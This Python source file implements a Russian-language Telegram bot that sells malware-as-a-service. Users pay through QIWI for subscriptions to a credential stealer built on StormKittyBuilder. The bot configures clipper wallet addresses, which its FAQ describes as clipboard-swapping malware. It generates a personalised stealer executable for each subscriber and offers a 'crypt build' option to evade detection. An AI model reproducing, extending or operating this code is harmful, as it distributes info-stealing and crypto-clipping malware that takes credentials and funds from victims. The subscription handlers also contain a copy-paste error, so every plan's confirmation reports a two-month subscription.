from aiogram import types
import datetime
import os
import time
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.utils.callback_data import CallbackData

from src.config import dp, api, storage, p2p
from src import db_ustils
# from src.buttons.default_user import user_kb
from src.buttons.user_panel import user_keyboard as userbtn
from src.models import users
from aiogram.types import ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, \
    InlineKeyboardButton, CallbackQuery

import random

btc_wallets = CallbackData("wallet", "wallet_type")
wallets_add = CallbackData("payment", "wallet_pay")
CHANEL_ID = "@deepsidenews"
NOTSUB_MESSAGE = "Для доступа подпишитесь на канал https://t.me/deepsidenews"

def check_sub_chanel(chat_member):
    print(chat_member["status"])
    if chat_member["status"] !="left":
        return True
    else:
        return False

@dp.message_handler(commands=["start"])
async def default_start_handler(message: types.Message):
    if check_sub_chanel(await api.get_chat_member(chat_id=CHANEL_ID,user_id=message.from_user.id)):
        await api.send_sticker(chat_id=message.from_user.id,
                               sticker=r"CAACAgQAAxkBAAEF52tjLJ_WAAEL0sjoL-aoNjNIMpxduNwAAp8RAAKm8XEee8GFA8n5UiEpBA")
        await message.answer(f"💃Добро пожаловать!💃 {message.from_user.full_name}", reply_markup=userbtn.kb_client)

        await db_ustils.add_user(message.from_user.id)
        # print(message) #принтит инфу об отправителе
    else:
        await api.send_message(message.from_user.id, NOTSUB_MESSAGE)



def time_sub_days(get_time):
    time_now = int(time.time())
    middle_time = int(get_time) - time_now
    if middle_time <= 0:
        return False
    else:
        dt = str(datetime.timedelta(seconds=middle_time))
        return dt

@dp.message_handler(text="Профиль")
async def bot_message(message: types.Message):
    buttons = types.InlineKeyboardMarkup()
    buttons.add(types.InlineKeyboardButton(text="Пополнить баланс".upper(), callback_data="add_balance"))
    messages = "\n⚙️Конфиг:"
    users_ids = await users.get_or_none(telegram_id=message.from_user.id)
    if users_ids:
        seconds_sub = await db_ustils.get_sub_days(message.from_user.id)
        user_sub_in_days = time_sub_days(seconds_sub)
        for key, value in users_ids.config.items():
            messages += f"\n{key} = {value}"
        user_profile_info = f"💎id: {await db_ustils.get_teleid(message.from_user.id)}\n" \
                            f"⭐️Подписка: {user_sub_in_days} \n" \
                            f"💸Баланс: {await db_ustils.get_money_balance(message.from_user.id)} ₽" \
                            f"{messages}\n"
        await api.send_message(message.from_user.id, user_profile_info, reply_markup=buttons)


@dp.callback_query_handler(text="add_balance")
async def add_user_balance(callback: types.CallbackQuery):
    await api.delete_message(callback.from_user.id, callback.message.message_id)
    wallets_addd = ["QIWI", "YOUMONEY", "BTCBANKER"]
    buttons = types.InlineKeyboardMarkup()
    for value in wallets_addd:
        buttons.add(
            types.InlineKeyboardButton(text=value.upper(), callback_data=wallets_add.new(wallet_pay=value)))
    await api.send_message(callback.from_user.id, "Выберите способ оплаты", reply_markup=buttons)


@dp.callback_query_handler(wallets_add.filter(wallet_pay="QIWI"))
async def name(context: types.callback_query, callback_data: dict):
    await context.message.answer(f'Напишите сумму для пополнения через {callback_data["wallet_pay"].upper()}')

    await ProfileStatesGroup.pay_wallet.set()
    state = dp.current_state(user=context.from_user.id)
    await state.update_data(key=callback_data["wallet_pay"])


###FSM Machine
class ProfileStatesGroup(StatesGroup):
    walletAddres = State()
    pay_wallet = State()


@dp.message_handler(state=ProfileStatesGroup.pay_wallet)
async def new_event_from_pay_state(message: types.Message, state: FSMContext):
    async with state.proxy() as storage:
        print(storage)
        if message.text.isdigit():
            match storage["key"]:
                case "QIWI":
                    comment = "schoolpirates" + "_" + str(random.randint(1000, 9999))
                    bill = p2p.bill(amount=message.text, lifetime=15, comment=comment)
                    await db_ustils.add_check(message.from_user.id, bill.bill_id, message.text)
                    await state.finish()
                    await message.answer(
                        f"Ваша ссылка на оплату готова, у вас есть 15 минут на оплату. Сумма: {message.text}\nСсылка:{bill.pay_url}",
                        reply_markup=userbtn.buy_menu(url=bill.pay_url, bill=bill.bill_id))
                case "YOUMONEY":
                    ...
                case "BTCBANKER":
                    ...
        else:
            await message.answer("Введите число!")


# qiwi oplata callback for check contains "check_"
@dp.callback_query_handler(text_contains="check_")
async def check(callback: types.CallbackQuery):
    bill = str(callback.data[6:])
    info = await db_ustils.get_check(bill)
    money_in_check = await db_ustils.get_money_in_check(bill)
    if info != False:
        if str(p2p.check(bill_id=bill).status) == "PAID":
            await api.send_message(callback.from_user.id, "Счет оплачен! напишите /start\n")
            user_money = await db_ustils.get_money_balance(callback.from_user.id)
            print("user_money:" + user_money)
            print("money in check" + str(money_in_check))
            await db_ustils.add_balance(callback.from_user.id, money_in_check)
            print("add_balance")

        else:
            await api.send_message(callback.from_user.id, "Вы не оплатили счет",
                                   reply_markup=userbtn.buy_menu(False, bill))
    else:
        await api.send_message(callback.from_user.id, "Счет не найден")


@dp.message_handler(state=ProfileStatesGroup.walletAddres)
async def new_event_from_state(message: types.Message, state: FSMContext):
    async with state.proxy() as storage:
        users_ids = await users.get_or_none(telegram_id=message.from_user.id)
        if users_ids:
            users_ids.config[storage["key"]] = message.text
            await message.answer("Установлено!")
            await users_ids.save()
            await state.finish()


@dp.callback_query_handler(btc_wallets.filter())
async def name(context: types.callback_query, callback_data: dict):
    await context.message.answer(f'Напишите новый ключ для {callback_data["wallet_type"].upper()}')
    await ProfileStatesGroup.walletAddres.set()
    state = dp.current_state(user=context.from_user.id)
    await state.update_data(key=callback_data["wallet_type"])


@dp.message_handler(text="Настройка")
async def nastr_message(message: types.Message):
    buttons = types.InlineKeyboardMarkup()
    users_ids = await users.get_or_none(telegram_id=message.from_user.id)
    if users_ids:
        for key, value in users_ids.config.items():
            if (key != "chat_id"):
                buttons.add(
                    types.InlineKeyboardButton(text=key.upper(), callback_data=btc_wallets.new(wallet_type=key)))

        await message.answer("Выберите параметр для настройки", reply_markup=buttons)


@dp.message_handler(text="Стиллер")
async def stealer_functional(message: types.Message):
    users_ids = await users.get_or_none(telegram_id=message.from_user.id)
    if users_ids:
        if users_ids.sub_day > 0:
            buttons = types.InlineKeyboardMarkup()
            buttons.add(types.InlineKeyboardButton(text="Сгенирировать билд", callback_data="gen_build"))
            buttons.add(types.InlineKeyboardButton(text="Криптовать билд", callback_data="crypt_build"))
            await message.answer("Выберите параметр", reply_markup=buttons)
        else:
            await message.answer("У вас нет подписки!")


@dp.callback_query_handler(text="gen_build")
async def gen_build(callback: types.CallbackQuery):
    await callback.message.answer("Генерация билда...")
    os.system(
        f"C:\\Users\\nikitageak\\Desktop\\stealer\\builder\\StormKittyBuilder\\bin\\Release\\deepsidebuilder.exe {callback.from_user.id}")
    with open(
            f"C:\\Users\\nikitageak\\Desktop\\stealer\\builder\\StormKittyBuilder\\bin\\Release\\stub\\{callback.from_user.id}.exe",
            "rb") as builded_exe:
        await callback.message.answer_document(document=builded_exe, caption="Держи свой билд. ")


@dp.message_handler(text="Поддержка")
async def support_contactic(message: types.Message):
    await message.answer("Admin: @reverse1337 \nSupport: -\n\nПеред тем как написать мне прочитайте FAQ")

@dp.message_handler(text="FAQ")
async def faqyou(message: types.Message):
    await message.answer(
        "🔥Приветствую в стиллере @schoolpirate🔥\n1)Что-бы воспользоваться стиллером нужно пополнить баланс в профиле, зайти в @Купить  и приобрести подписку .\n2)❓Если возникнут вопросы пишите их адекватно и структурированно без (ну, там, как-бы, памагите)\n3)⚙️ Настройте ваш конфиг для стиллера в кнопке @Настройка -- там вы сможете увидеть список кошельков для клиппера в стиллере(клиппер -  ͟в͟р͟е͟д͟о͟н͟о͟с͟н͟а͟я͟ ͟п͟р͟о͟г͟р͟а͟м͟м͟а͟,͟ ͟к͟о͟т͟о͟р͟а͟я͟ ͟м͟о͟н͟и͟т͟о͟р͟и͟т͟ ͟б͟у͟ф͟е͟р͟ ͟о͟б͟м͟е͟н͟а͟ ͟н͟а͟ ͟н͟а͟л͟и͟ч͟и͟е͟ ͟к͟а͟к͟и͟х͟-͟л͟и͟б͟о͟ ͟д͟а͟н͟н͟ы͟х͟,͟ ͟и͟,͟ ͟в͟ ͟с͟л͟у͟ч͟а͟е͟ ͟и͟х͟ ͟н͟а͟х͟о͟ж͟д͟е͟н͟и͟я͟,͟ ͟з͟а͟м͟е͟н͟я͟е͟т͟ ͟н͟а͟ ͟у͟к͟а͟з͟а͟н͟н͟ы͟е͟.͟͟͟)\n\nАктуальный прайс:\n2 месяца - 300руб.\nГод - 1400руб.\nНавсегда - 3400руб.")

@dp.message_handler(text="Купить")
async def buy_subscribe(message: types.Message):
    buttons = types.InlineKeyboardMarkup()
    buttons.add(types.InlineKeyboardButton(text="2 месяца (300 руб.)", callback_data="tow_month_sub")) #300
    buttons.add(types.InlineKeyboardButton(text="Год (1400 руб.)", callback_data="one_year")) #1400
    buttons.add(types.InlineKeyboardButton(text="Навсегда (3400 руб.)", callback_data="forever_sub")) #3400
    await message.answer("Выберите срок подписки", reply_markup=buttons)

def days_to_seconds(days):
    return days * 24 * 60 * 60

@dp.callback_query_handler(text="tow_month_sub")
async def month_sub(callback: types.CallbackQuery):
    time_sub = int(time.time()) + days_to_seconds(60)
    users_ids = await users.get_or_none(telegram_id=callback.from_user.id)
    if users_ids:
        if users_ids.money >= 300:
            await db_ustils.add_sub_days(callback.from_user.id, time_sub, 300)
            await api.send_message(callback.from_user.id, "Вам выдана подписка на 2 месяца!")
        else:
            await api.send_message(callback.from_user.id, "Недостаточно денег на балансе")

@dp.callback_query_handler(text="one_year")
async def month_sub(callback: types.CallbackQuery):
    time_sub = int(time.time()) + days_to_seconds(365)
    users_ids = await users.get_or_none(telegram_id=callback.from_user.id)
    if users_ids:
        if users_ids.money >= 1400:
            await db_ustils.add_sub_days(callback.from_user.id, time_sub, 1400)
            await api.send_message(callback.from_user.id, "Вам выдана подписка на 2 месяца!")
        else:
            await api.send_message(callback.from_user.id, "Недостаточно денег на балансе")


@dp.callback_query_handler(text="forever_sub")
async def month_sub(callback: types.CallbackQuery):
    time_sub = int(time.time()) + days_to_seconds(9999)
    users_ids = await users.get_or_none(telegram_id=callback.from_user.id)
    if users_ids:
        if users_ids.money >= 3400:
            await db_ustils.add_sub_days(callback.from_user.id, time_sub, 3400)
            await api.send_message(callback.from_user.id, "Вам выдана подписка на 2 месяца!")
        else:
            await api.send_message(callback.from_user.id, "Недостаточно денег на балансе")
